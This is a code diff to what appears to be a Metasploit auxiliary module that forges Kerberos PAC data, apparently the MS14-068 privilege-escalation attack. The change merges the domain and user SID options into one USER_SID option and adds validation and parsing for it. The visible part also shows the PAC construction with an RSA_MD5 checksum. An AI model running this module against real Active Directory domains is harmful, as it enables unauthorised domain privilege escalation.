@@ -44,14 +44,24 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         OptString.new('USER', [ true, 'The Domain User' ]),
-        OptInt.new('USER_SID', [ true, 'The Domain User SID, Ex: 1000']),
         OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
         OptString.new('DOMAIN', [ true, 'The Domain Ex: DEMO.LOCAL' ]),
-        OptString.new('DOMAIN_SID', [ true, 'The Domain SID Ex: S-1-5-21-1755879683-3641577184-3486455962' ])
+        OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
       ], self.class)
   end
 
   def run
+    print_status("Validating options...")
+
+    unless datastore['USER_SID'] =~ /^S-(\d+-){6}\d+$/
+      print_error("Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000")
+      return
+    end
+
+    user_sid_arr = datastore['USER_SID'].split('-')
+    domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
+    user_rid = user_sid_arr[user_sid_arr.length - 1].to_i
+
     print_status("#{peer} - Connecting with the KDC...")
     connect
 
@@ -97,8 +107,8 @@ class Metasploit4 < Msf::Auxiliary
     pac = build_pac(
       client_name: datastore['USER'],
       group_ids: groups,
-      domain_id: datastore['DOMAIN_SID'],
-      user_id: datastore['USER_SID'],
+      domain_id: domain_sid,
+      user_id: user_rid,
       realm: datastore['DOMAIN'],
       logon_time: logon_time,
       checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
